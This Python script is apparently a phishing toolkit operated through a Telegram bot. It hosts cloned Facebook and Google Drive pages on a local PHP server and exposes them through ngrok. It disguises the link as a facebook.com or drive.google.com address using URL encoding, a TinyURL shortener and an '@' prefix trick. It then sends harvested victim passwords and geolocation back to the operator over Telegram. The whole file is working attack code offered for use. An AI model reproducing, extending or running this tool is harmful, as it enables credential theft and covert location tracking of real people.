import telebot
import subprocess
import requests
import json
import time
import os
import pyshorteners
import argparse

def banner():
	subprocess.run("cls", shell=True)
	print("	")
	print("	")
	print("         ██╗██╗     ██╗     ██╗   ██╗███╗   ███╗██╗███╗   ██╗ █████╗ ████████╗██╗")
	print("         ██║██║     ██║     ██║   ██║████╗ ████║██║████╗  ██║██╔══██╗╚══██╔══╝██║")
	print("         ██║██║     ██║     ██║   ██║██╔████╔██║██║██╔██╗ ██║███████║   ██║   ██║")
	print("         ██║██║     ██║     ██║   ██║██║╚██╔╝██║██║██║╚██╗██║██╔══██║   ██║   ██║")
	print("         ██║███████╗███████╗╚██████╔╝██║ ╚═╝ ██║██║██║ ╚████║██║  ██║   ██║   ██║")
	print("         ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝   ╚═╝")
	print("	")
	print("	[>] Created By: Kariel Granados")
	print("	[>] The author and Telegram are not responsible for its misuse")
	print("	")
	print("	")

arg = argparse.ArgumentParser()
arg.add_argument("-t", '--token',help="TOKEN of our bot")
arg.add_argument("-i", '--id',help="Our ID")
arg = arg.parse_args()

if arg.token and arg.id:
	token = arg.token
	bot_id = arg.id
	banner()
	pass
else:
	print("You need to put your credentials")
	quit()

teleconvert = telebot.TeleBot(token)
teleconvert.send_message(bot_id, "Bot listo")

def receive_message(message):
	for m in message:
		if m.content_type == "text":
			text = m.text
			if text == "exit":
				teleconvert.send_message(bot_id, "Programa cerrado")
				close()
				time.sleep(1)
				subprocess.Popen(['pkill', 'python'])
				
			if "clon facebook" in text:
				create_page_facebook()
				teleconvert.send_message(bot_id, "Esperando victima de facebook....")
				listen_page("facebook/pass.txt")

			if "clon drive" in text:
				create_page_drive()
				teleconvert.send_message(bot_id, "Esperando la ubicacion de la victima....")
				listen_page("google_drive/php/geo.txt")
				
def close():
	subprocess.Popen(['pkill', 'php'])
	time.sleep(1)
	subprocess.Popen(['pkill', 'ngrok'])

def create_page_drive():
	print("[>] Starting...")
	close()
	teleconvert.send_message(bot_id, "Creando URL falsa de google drive...Espera un momento" )
	start_ngrok()
	start_php("/google_drive","http://127.0.0.1:8080/index.html" )
	time.sleep(2)
	create_fake_url("https://www.drive.google.com-profile-user-images-@")

def create_page_facebook():
	print("[>] Starting... ")
	close()
	teleconvert.send_message(bot_id, "Creando URL falsa de facebook...Espera un momento" )
	start_ngrok()
	start_php("/facebook","http://127.0.0.1:8080/index.php" )
	time.sleep(2)
	create_fake_url("https://www.facebook.com-profile-iniciar-sesion-facebook-@")

def listen_page(file_path):
	while(True):
		if os.path.exists(file_path):
			p = open(file_path)
			credentials=p.read()
			teleconvert.send_message(bot_id, credentials)
			p.close()
			os.remove(file_path)
			print("[>] Completed process\n\n")
			break;
		time.sleep(4)

def start_php(folder, link):
	with open("logs/stdout.txt","w") as out, open("logs/stderr.txt","w") as err:
		#subprocess.Popen("php -S 127.0.0.1:8080 -t home/kali/telegram_hack/facebook/",stdout=out,stderr=err)
		subprocess.Popen(['php', '-S', '127.0.0.1:8080',  '-t',  os.getcwd() + folder], stdout=out,stderr=err)
		time.sleep(2)
		get_url = requests.get(link)
		if get_url.status_code == 200:
			print("[>] PHP successfully executed ")
		else: 
			print("[>] PHP did not work correctly")

def start_ngrok():
	global url_ngrok
	with open("logs/stdout.txt","w") as out, open("logs/stderr.txt","w") as err:
		try:
			subprocess.Popen(['./ngrok' ,'http' , '8080'] ,stdout=out,stderr=err)
			time.sleep(2)
			url = requests.get("http://127.0.0.1:4040/api/tunnels")
			if url.status_code == 200:
				url_json = json.loads(url.content)
				for n in url_json['tunnels']:
					if "https" in n['public_url']:
						url_ngrok = n['public_url']
				print("[>] NGROK successfully executed ")
		except Exception as e:
			print("[>] NGROK did not work properly")


def create_fake_url(link):
	url_tiny = url_ngrok.replace("o", "%4F")
	s = pyshorteners.Shortener()
	url_short = s.tinyurl.short(url_tiny)
	url_short = link + url_short[8:]
	teleconvert.send_message(bot_id, str(url_short) )
	print("[>] Server Ready ")


teleconvert.set_update_listener(receive_message)
teleconvert.polling()
teleconvert.polling(none_stop=False)
teleconvert.polling(interval=5)
	
while True:
    pass 

